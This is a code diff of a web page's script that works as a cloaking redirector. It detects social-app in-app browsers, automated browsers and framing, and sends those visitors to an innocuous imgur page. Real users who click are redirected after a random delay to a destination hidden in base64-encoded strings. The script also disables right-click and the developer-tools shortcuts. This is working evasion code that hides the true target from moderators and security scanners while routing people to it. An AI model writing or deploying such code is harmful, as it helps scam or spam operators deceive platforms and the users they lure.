@@ -57,48 +57,48 @@
   </div>
 
   <script>
-    (() => {
-      const u = navigator.userAgent.toLowerCase();
-      const bots = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
-      const isBot = bots.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver;
+    const baitAgents = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isBait = baitAgents.some(agent => userAgent.includes(agent));
+    const isBot = navigator.webdriver || window.top !== window.self;
 
-      let human = false;
+    if (isBait || isBot) {
+      location.href = "https://imgur.com/user/carlovershub";
+    }
 
-      const markHuman = () => human = true;
-      document.addEventListener("mousemove", markHuman, { once: true });
-      document.addEventListener("touchstart", markHuman, { once: true });
-      document.addEventListener("keydown", markHuman, { once: true });
+    let userActive = false;
 
-      setTimeout(() => {
-        if (isBot || !human) {
-          location.href = "https://imgur.com/user/carlovershub";
-        }
-      }, 3000);
-    })();
+    const markActive = () => userActive = true;
+    document.addEventListener("mousemove", markActive);
+    document.addEventListener("touchstart", markActive);
+    document.addEventListener("keypress", markActive);
 
-    document.addEventListener("contextmenu", e => e.preventDefault());
-    document.onkeydown = e => {
-      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
-    };
-
-    let interacted = false;
-    document.addEventListener("mousemove", () => interacted = true);
-    document.addEventListener("touchstart", () => interacted = true);
-    document.addEventListener("keypress", () => interacted = true);
+    setTimeout(() => {
+      if (!userActive) {
+        location.href = "https://imgur.com/user/carlovershub";
+      }
+    }, 3500);
 
     function go() {
-      if (!interacted) return;
+      if (!userActive) return;
 
       document.querySelector(".btn").style.display = "none";
       document.getElementById("loading").style.display = "flex";
 
+      const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
+      const p2 = "ZWhiaXhlZQ==";
+      const url = atob(p1 + p2);
+
       setTimeout(() => {
-        const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
-        const p2 = "ZWhiaXhlZQ==";
-        const url = atob(p1 + p2);
-        if (url.startsWith("http")) window.location.replace(url);
+        window.location.replace(url);
       }, 2000 + Math.random() * 1000);
     }
+
+  
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = e => {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
+    };
   </script>
 </body>
 </html>
